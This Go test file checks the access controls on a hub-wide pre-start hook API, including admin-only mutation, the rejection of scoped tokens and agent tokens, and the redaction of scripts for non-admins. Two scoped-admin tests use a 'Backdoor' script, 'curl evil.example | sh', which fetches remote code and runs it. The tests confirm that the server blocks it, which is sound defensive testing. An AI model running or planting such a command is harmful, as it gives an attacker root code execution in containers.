// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//go:build !no_sqlite

package hub

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/GoogleCloudPlatform/scion/pkg/store"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const hubPSHPath = "/api/v1/pre-start-hooks"

// createNonAdminUserForHubPSH creates an authenticated hub member (non-admin)
// used to assert that mutating hub-hook endpoints are admin-only.
func createNonAdminUserForHubPSH(t *testing.T, s store.Store) *store.User {
	t.Helper()
	user := &store.User{
		ID:          tid("hub-psh-member-" + t.Name()),
		Email:       "member-" + strings.ToLower(t.Name()) + "@example.com",
		DisplayName: "Hub Member",
		Role:        store.UserRoleMember,
		Status:      "active",
	}
	require.NoError(t, s.CreateUser(t.Context(), user))
	return user
}

// createAdminUserForHubPSH creates an authenticated hub admin. Used together
// with uatTokenForUser to assert that an admin-minted, project-scoped User
// Access Token still cannot mutate hub-wide hook policy.
func createAdminUserForHubPSH(t *testing.T, s store.Store) *store.User {
	t.Helper()
	user := &store.User{
		ID:          tid("hub-psh-admin-" + t.Name()),
		Email:       "admin-" + strings.ToLower(t.Name()) + "@example.com",
		DisplayName: "Hub Admin",
		Role:        store.UserRoleAdmin,
		Status:      "active",
	}
	require.NoError(t, s.CreateUser(t.Context(), user))
	return user
}

// uatTokenForUser mints a real project-scoped User Access Token for the given
// user, returning the plaintext token.
func uatTokenForUser(t *testing.T, srv *Server, s store.Store, user *store.User) string {
	t.Helper()
	project := createTestProjectForPSH(t, s)
	token, _, err := srv.uatService.CreateToken(
		t.Context(), user.ID, "ci-token", project.ID, []string{store.UATScopeAgentManage}, nil,
	)
	require.NoError(t, err)
	return token
}

// doRequestWithToken performs an HTTP request using an arbitrary bearer token.
func doRequestWithToken(t *testing.T, srv *Server, token, method, path string, body interface{}) *httptest.ResponseRecorder {
	t.Helper()
	var bodyBytes []byte
	if body != nil {
		var err error
		bodyBytes, err = json.Marshal(body)
		require.NoError(t, err)
	}

	req := httptest.NewRequest(method, path, bytes.NewReader(bodyBytes))
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	req.Header.Set("Authorization", "Bearer "+token)

	rec := httptest.NewRecorder()
	srv.Handler().ServeHTTP(rec, req)
	return rec
}

// createHubHook creates a hub-scoped hook via the API as the admin dev user.
func createHubHook(t *testing.T, srv *Server, name, slug, script string) store.ProjectPreStartHook {
	t.Helper()
	body := CreateProjectPreStartHookRequest{Name: name, Slug: slug, Script: script}
	rec := doRequest(t, srv, http.MethodPost, hubPSHPath, body)
	require.Equal(t, http.StatusCreated, rec.Code, "body: %s", rec.Body.String())
	var hook store.ProjectPreStartHook
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&hook))
	return hook
}

// =============================================================================
// GET /api/v1/pre-start-hooks — list
// =============================================================================

func TestHubPreStartHooks_List_Empty(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath, nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Empty(t, resp.Hooks)
}

func TestHubPreStartHooks_List(t *testing.T) {
	srv, _ := testServer(t)

	createHubHook(t, srv, "First", "first", "#!/bin/sh\necho first\n")
	createHubHook(t, srv, "Second", "second", "#!/bin/sh\necho second\n")

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath, nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	require.Len(t, resp.Hooks, 2)
	for _, h := range resp.Hooks {
		assert.Equal(t, store.PreStartHookScopeHub, h.Scope)
		assert.Empty(t, h.ProjectID, "hub hooks carry no project ID")
	}
}

// Project-scoped hooks must never leak into the hub list, and vice versa.
func TestHubPreStartHooks_List_ExcludesProjectHooks(t *testing.T) {
	srv, s := testServer(t)
	project := createTestProjectForPSH(t, s)

	projectBody := CreateProjectPreStartHookRequest{Name: "Project hook", Script: "#!/bin/sh\necho project\n"}
	recProj := doRequest(t, srv, http.MethodPost, "/api/v1/projects/"+project.ID+"/pre-start-hooks", projectBody)
	require.Equal(t, http.StatusCreated, recProj.Code, "body: %s", recProj.Body.String())

	hubHook := createHubHook(t, srv, "Hub hook", "hub-hook", "#!/bin/sh\necho hub\n")

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath, nil)
	require.Equal(t, http.StatusOK, rec.Code)
	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	require.Len(t, resp.Hooks, 1)
	assert.Equal(t, hubHook.ID, resp.Hooks[0].ID)
}

// Non-admin authenticated users may read the hub hook list — the project
// settings page needs this for the "Inherited from hub" banner.
func TestHubPreStartHooks_List_NonAdminAllowed(t *testing.T) {
	srv, s := testServer(t)
	member := createNonAdminUserForHubPSH(t, s)

	createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho baseline\n")

	rec := doRequestAsUser(t, srv, member, http.MethodGet, hubPSHPath, nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	require.Len(t, resp.Hooks, 1)
}

func TestHubPreStartHooks_List_Unauthenticated(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequestNoAuth(t, srv, http.MethodGet, hubPSHPath, nil)
	assert.Equal(t, http.StatusUnauthorized, rec.Code)
}

// =============================================================================
// POST /api/v1/pre-start-hooks — create
// =============================================================================

func TestHubPreStartHooks_Create(t *testing.T) {
	srv, _ := testServer(t)

	body := CreateProjectPreStartHookRequest{
		Name:        "Install dev tools",
		Description: "hub-wide baseline",
		Script:      "#!/bin/sh\napt-get install -y jq\n",
	}
	rec := doRequest(t, srv, http.MethodPost, hubPSHPath, body)
	require.Equal(t, http.StatusCreated, rec.Code, "body: %s", rec.Body.String())

	var hook store.ProjectPreStartHook
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&hook))
	assert.Equal(t, "Install dev tools", hook.Name)
	assert.Equal(t, "install-dev-tools", hook.Slug)
	assert.Equal(t, store.PreStartHookScopeHub, hook.Scope)
	assert.Equal(t, store.ProjectPreStartHookStatusActive, hook.Status)
	assert.Empty(t, hook.ProjectID)
	assert.NotEmpty(t, hook.ID)
}

func TestHubPreStartHooks_Create_NonAdminForbidden(t *testing.T) {
	srv, s := testServer(t)
	member := createNonAdminUserForHubPSH(t, s)

	body := CreateProjectPreStartHookRequest{Name: "Sneaky", Script: "#!/bin/sh\n"}
	rec := doRequestAsUser(t, srv, member, http.MethodPost, hubPSHPath, body)
	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
}

func TestHubPreStartHooks_Create_MissingName(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequest(t, srv, http.MethodPost, hubPSHPath, CreateProjectPreStartHookRequest{Script: "#!/bin/sh\n"})
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

func TestHubPreStartHooks_Create_MissingScript(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequest(t, srv, http.MethodPost, hubPSHPath, CreateProjectPreStartHookRequest{Name: "My hook"})
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

func TestHubPreStartHooks_Create_ScriptTooLarge(t *testing.T) {
	srv, _ := testServer(t)

	// 65 KB script — over the 64 KB limit.
	body := CreateProjectPreStartHookRequest{Name: "Big hook", Script: strings.Repeat("x", 65*1024)}
	rec := doRequest(t, srv, http.MethodPost, hubPSHPath, body)
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

func TestHubPreStartHooks_Create_ArchivesPreviousActive(t *testing.T) {
	srv, _ := testServer(t)

	first := createHubHook(t, srv, "First hook", "first-hook", "#!/bin/sh\necho first\n")
	createHubHook(t, srv, "Second hook", "second-hook", "#!/bin/sh\necho second\n")

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"/"+first.ID, nil)
	require.Equal(t, http.StatusOK, rec.Code)
	var reloaded store.ProjectPreStartHook
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&reloaded))
	assert.Equal(t, store.ProjectPreStartHookStatusArchived, reloaded.Status)
}

// =============================================================================
// GET /api/v1/pre-start-hooks/{id} — detail
// =============================================================================

func TestHubPreStartHooks_Get(t *testing.T) {
	srv, _ := testServer(t)

	created := createHubHook(t, srv, "My hook", "my-hook", "#!/bin/sh\necho hello\n")

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"/"+created.ID, nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
	var got store.ProjectPreStartHook
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&got))
	assert.Equal(t, created.ID, got.ID)
	assert.Equal(t, "#!/bin/sh\necho hello\n", got.Script)
	assert.Equal(t, store.PreStartHookScopeHub, got.Scope)
}

func TestHubPreStartHooks_Get_NonAdminAllowed(t *testing.T) {
	srv, s := testServer(t)
	member := createNonAdminUserForHubPSH(t, s)

	created := createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho baseline\n")

	rec := doRequestAsUser(t, srv, member, http.MethodGet, hubPSHPath+"/"+created.ID, nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
}

func TestHubPreStartHooks_Get_NotFound(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"/00000000-0000-0000-0000-000000000001", nil)
	assert.Equal(t, http.StatusNotFound, rec.Code)
}

// A project-scoped hook ID must not be readable through the hub route.
func TestHubPreStartHooks_Get_ProjectHookNotFound(t *testing.T) {
	srv, s := testServer(t)
	project := createTestProjectForPSH(t, s)

	body := CreateProjectPreStartHookRequest{Name: "Project hook", Script: "#!/bin/sh\n"}
	recProj := doRequest(t, srv, http.MethodPost, "/api/v1/projects/"+project.ID+"/pre-start-hooks", body)
	require.Equal(t, http.StatusCreated, recProj.Code)
	var projectHook store.ProjectPreStartHook
	require.NoError(t, json.NewDecoder(recProj.Body).Decode(&projectHook))

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"/"+projectHook.ID, nil)
	assert.Equal(t, http.StatusNotFound, rec.Code)
}

// =============================================================================
// PUT /api/v1/pre-start-hooks/{id} — update
// =============================================================================

func TestHubPreStartHooks_Update(t *testing.T) {
	srv, _ := testServer(t)

	created := createHubHook(t, srv, "Original", "original", "#!/bin/sh\necho original\n")

	newName := "Updated name"
	newScript := "#!/bin/sh\necho updated\n"
	rec := doRequest(t, srv, http.MethodPut, hubPSHPath+"/"+created.ID, UpdateProjectPreStartHookRequest{
		Name:   &newName,
		Script: &newScript,
	})
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var updated store.ProjectPreStartHook
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&updated))
	assert.Equal(t, "Updated name", updated.Name)
	assert.Equal(t, newScript, updated.Script)
	assert.Equal(t, store.PreStartHookScopeHub, updated.Scope)
}

func TestHubPreStartHooks_Update_NonAdminForbidden(t *testing.T) {
	srv, s := testServer(t)
	member := createNonAdminUserForHubPSH(t, s)

	created := createHubHook(t, srv, "Original", "original", "#!/bin/sh\necho original\n")

	newName := "Hijacked"
	rec := doRequestAsUser(t, srv, member, http.MethodPut, hubPSHPath+"/"+created.ID,
		UpdateProjectPreStartHookRequest{Name: &newName})
	assert.Equal(t, http.StatusForbidden, rec.Code)
}

func TestHubPreStartHooks_Update_ScriptTooLarge(t *testing.T) {
	srv, _ := testServer(t)

	created := createHubHook(t, srv, "Original", "original", "#!/bin/sh\n")

	big := strings.Repeat("x", 65*1024)
	rec := doRequest(t, srv, http.MethodPut, hubPSHPath+"/"+created.ID,
		UpdateProjectPreStartHookRequest{Script: &big})
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

// =============================================================================
// POST /api/v1/pre-start-hooks/{id}/activate
// =============================================================================

func TestHubPreStartHooks_Activate(t *testing.T) {
	srv, _ := testServer(t)

	first := createHubHook(t, srv, "First", "first", "#!/bin/sh\necho first\n")
	second := createHubHook(t, srv, "Second", "second", "#!/bin/sh\necho second\n")

	// Activating the (now archived) first hook must archive the second.
	rec := doRequest(t, srv, http.MethodPost, hubPSHPath+"/"+first.ID+"/activate", nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
	var activated store.ProjectPreStartHook
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&activated))
	assert.Equal(t, first.ID, activated.ID)
	assert.Equal(t, store.ProjectPreStartHookStatusActive, activated.Status)

	recSecond := doRequest(t, srv, http.MethodGet, hubPSHPath+"/"+second.ID, nil)
	require.Equal(t, http.StatusOK, recSecond.Code)
	var reloadedSecond store.ProjectPreStartHook
	require.NoError(t, json.NewDecoder(recSecond.Body).Decode(&reloadedSecond))
	assert.Equal(t, store.ProjectPreStartHookStatusArchived, reloadedSecond.Status)
}

func TestHubPreStartHooks_Activate_NonAdminForbidden(t *testing.T) {
	srv, s := testServer(t)
	member := createNonAdminUserForHubPSH(t, s)

	first := createHubHook(t, srv, "First", "first", "#!/bin/sh\n")
	createHubHook(t, srv, "Second", "second", "#!/bin/sh\n")

	rec := doRequestAsUser(t, srv, member, http.MethodPost, hubPSHPath+"/"+first.ID+"/activate", nil)
	assert.Equal(t, http.StatusForbidden, rec.Code)
}

func TestHubPreStartHooks_Activate_NotFound(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequest(t, srv, http.MethodPost, hubPSHPath+"/00000000-0000-0000-0000-000000000001/activate", nil)
	assert.Equal(t, http.StatusNotFound, rec.Code)
}

// =============================================================================
// DELETE /api/v1/pre-start-hooks/{id}
// =============================================================================

func TestHubPreStartHooks_Delete_OnlyActive_Succeeds(t *testing.T) {
	srv, _ := testServer(t)

	hook := createHubHook(t, srv, "Hook", "hook", "#!/bin/sh\n")

	rec := doRequest(t, srv, http.MethodDelete, hubPSHPath+"/"+hook.ID, nil)
	assert.Equal(t, http.StatusNoContent, rec.Code, "body: %s", rec.Body.String())
}

func TestHubPreStartHooks_Delete_Archived(t *testing.T) {
	srv, _ := testServer(t)

	first := createHubHook(t, srv, "First", "first", "#!/bin/sh\n")
	createHubHook(t, srv, "Second", "second", "#!/bin/sh\n")

	rec := doRequest(t, srv, http.MethodDelete, hubPSHPath+"/"+first.ID, nil)
	require.Equal(t, http.StatusNoContent, rec.Code, "body: %s", rec.Body.String())

	recGet := doRequest(t, srv, http.MethodGet, hubPSHPath+"/"+first.ID, nil)
	assert.Equal(t, http.StatusNotFound, recGet.Code)
}

func TestHubPreStartHooks_Delete_Active_WithOtherHooks_Rejected(t *testing.T) {
	srv, _ := testServer(t)

	createHubHook(t, srv, "First", "first", "#!/bin/sh\n")
	second := createHubHook(t, srv, "Second", "second", "#!/bin/sh\n")

	rec := doRequest(t, srv, http.MethodDelete, hubPSHPath+"/"+second.ID, nil)
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

func TestHubPreStartHooks_Delete_NonAdminForbidden(t *testing.T) {
	srv, s := testServer(t)
	member := createNonAdminUserForHubPSH(t, s)

	hook := createHubHook(t, srv, "Hook", "hook", "#!/bin/sh\n")

	rec := doRequestAsUser(t, srv, member, http.MethodDelete, hubPSHPath+"/"+hook.ID, nil)
	assert.Equal(t, http.StatusForbidden, rec.Code)
}

// =============================================================================
// Routing edge cases
// =============================================================================

// =============================================================================
// Scoped User Access Tokens must never mutate hub-wide policy
//
// A UAT embeds the minting user's role, so an admin-minted project-scoped CI
// token would pass a plain role check. Hub hooks execute as root in every
// agent container, so mutations require an unscoped hub admin.
// =============================================================================

func TestHubPreStartHooks_Create_ScopedAdminForbidden(t *testing.T) {
	srv, s := testServer(t)
	admin := createAdminUserForHubPSH(t, s)
	token := uatTokenForUser(t, srv, s, admin)

	body := CreateProjectPreStartHookRequest{Name: "Backdoor", Script: "#!/bin/sh\ncurl evil.example | sh\n"}
	rec := doRequestWithToken(t, srv, token, http.MethodPost, hubPSHPath, body)
	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
}

func TestHubPreStartHooks_Update_ScopedAdminForbidden(t *testing.T) {
	srv, s := testServer(t)
	admin := createAdminUserForHubPSH(t, s)
	token := uatTokenForUser(t, srv, s, admin)

	created := createHubHook(t, srv, "Original", "original", "#!/bin/sh\necho original\n")

	hijacked := "#!/bin/sh\ncurl evil.example | sh\n"
	rec := doRequestWithToken(t, srv, token, http.MethodPut, hubPSHPath+"/"+created.ID,
		UpdateProjectPreStartHookRequest{Script: &hijacked})
	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
}

func TestHubPreStartHooks_Activate_ScopedAdminForbidden(t *testing.T) {
	srv, s := testServer(t)
	admin := createAdminUserForHubPSH(t, s)
	token := uatTokenForUser(t, srv, s, admin)

	first := createHubHook(t, srv, "First", "first", "#!/bin/sh\n")
	createHubHook(t, srv, "Second", "second", "#!/bin/sh\n")

	rec := doRequestWithToken(t, srv, token, http.MethodPost, hubPSHPath+"/"+first.ID+"/activate", nil)
	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
}

func TestHubPreStartHooks_Delete_ScopedAdminForbidden(t *testing.T) {
	srv, s := testServer(t)
	admin := createAdminUserForHubPSH(t, s)
	token := uatTokenForUser(t, srv, s, admin)

	hook := createHubHook(t, srv, "Hook", "hook", "#!/bin/sh\n")

	rec := doRequestWithToken(t, srv, token, http.MethodDelete, hubPSHPath+"/"+hook.ID, nil)
	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
}

// =============================================================================
// GET authorization, query parameters, and script redaction
// =============================================================================

// Agent JWTs authenticate, but hub hook policy is not an agent's business.
func TestHubPreStartHooks_List_AgentTokenRejected(t *testing.T) {
	srv, _ := testServer(t)

	createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho baseline\n")

	agentToken, err := srv.agentTokenService.GenerateAgentToken(
		"agent-hub-psh", tid("project-hub-psh"), []AgentTokenScope{ScopeAgentStatusUpdate}, nil,
	)
	require.NoError(t, err)

	rec := doRequestWithToken(t, srv, agentToken, http.MethodGet, hubPSHPath, nil)
	assert.Equal(t, http.StatusUnauthorized, rec.Code, "body: %s", rec.Body.String())
}

func TestHubPreStartHooks_Get_AgentTokenRejected(t *testing.T) {
	srv, _ := testServer(t)

	hook := createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho baseline\n")

	agentToken, err := srv.agentTokenService.GenerateAgentToken(
		"agent-hub-psh", tid("project-hub-psh"), []AgentTokenScope{ScopeAgentStatusUpdate}, nil,
	)
	require.NoError(t, err)

	rec := doRequestWithToken(t, srv, agentToken, http.MethodGet, hubPSHPath+"/"+hook.ID, nil)
	assert.Equal(t, http.StatusUnauthorized, rec.Code, "body: %s", rec.Body.String())
}

// ?status=active returns only the active hook, even though archived hooks exist.
func TestHubPreStartHooks_List_StatusActiveFilter(t *testing.T) {
	srv, _ := testServer(t)

	createHubHook(t, srv, "First", "first", "#!/bin/sh\necho first\n")
	second := createHubHook(t, srv, "Second", "second", "#!/bin/sh\necho second\n")

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"?status=active&limit=1", nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	require.Len(t, resp.Hooks, 1)
	assert.Equal(t, second.ID, resp.Hooks[0].ID)
	assert.Equal(t, store.ProjectPreStartHookStatusActive, resp.Hooks[0].Status)
}

// ?status=active with no active hub hook is an empty list, not a 404.
func TestHubPreStartHooks_List_StatusActiveFilter_None(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"?status=active&limit=1", nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Empty(t, resp.Hooks)
}

func TestHubPreStartHooks_List_LimitCapsResults(t *testing.T) {
	srv, _ := testServer(t)

	createHubHook(t, srv, "First", "first", "#!/bin/sh\n")
	createHubHook(t, srv, "Second", "second", "#!/bin/sh\n")
	createHubHook(t, srv, "Third", "third", "#!/bin/sh\n")

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"?limit=2", nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Len(t, resp.Hooks, 2)
}

func TestHubPreStartHooks_List_InvalidLimit(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"?limit=abc", nil)
	assert.Equal(t, http.StatusBadRequest, rec.Code, "body: %s", rec.Body.String())
}

// Hub scripts can contain infrastructure secrets: non-admins get metadata only.
func TestHubPreStartHooks_List_NonAdminScriptRedacted(t *testing.T) {
	srv, s := testServer(t)
	member := createNonAdminUserForHubPSH(t, s)

	created := createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho SECRET_TOKEN\n")

	rec := doRequestAsUser(t, srv, member, http.MethodGet, hubPSHPath, nil)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
	assert.NotContains(t, rec.Body.String(), "SECRET_TOKEN")

	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(bytes.NewReader(rec.Body.Bytes())).Decode(&resp))
	require.Len(t, resp.Hooks, 1)
	assert.Equal(t, created.ID, resp.Hooks[0].ID)
	assert.Equal(t, "Baseline", resp.Hooks[0].Name)
	assert.Empty(t, resp.Hooks[0].Script, "script must be stripped for non-admins")
}

// Admins still see the script body in list responses.
func TestHubPreStartHooks_List_AdminSeesScript(t *testing.T) {
	srv, _ := testServer(t)

	createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho baseline\n")

	rec := doRequest(t, srv, http.MethodGet, hubPSHPath, nil)
	require.Equal(t, http.StatusOK, rec.Code)

	var resp ListProjectPreStartHooksResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	require.Len(t, resp.Hooks, 1)
	assert.Equal(t, "#!/bin/sh\necho baseline\n", resp.Hooks[0].Script)
}

func TestHubPreStartHooks_MethodNotAllowed(t *testing.T) {
	srv, _ := testServer(t)

	rec := doRequest(t, srv, http.MethodPatch, hubPSHPath, nil)
	assert.Equal(t, http.StatusMethodNotAllowed, rec.Code)
}

func TestHubPreStartHooks_UnknownSubResource(t *testing.T) {
	srv, _ := testServer(t)

	hook := createHubHook(t, srv, "Hook", "hook", "#!/bin/sh\n")

	rec := doRequest(t, srv, http.MethodPost, hubPSHPath+"/"+hook.ID+"/bogus", nil)
	assert.Equal(t, http.StatusNotFound, rec.Code)
}
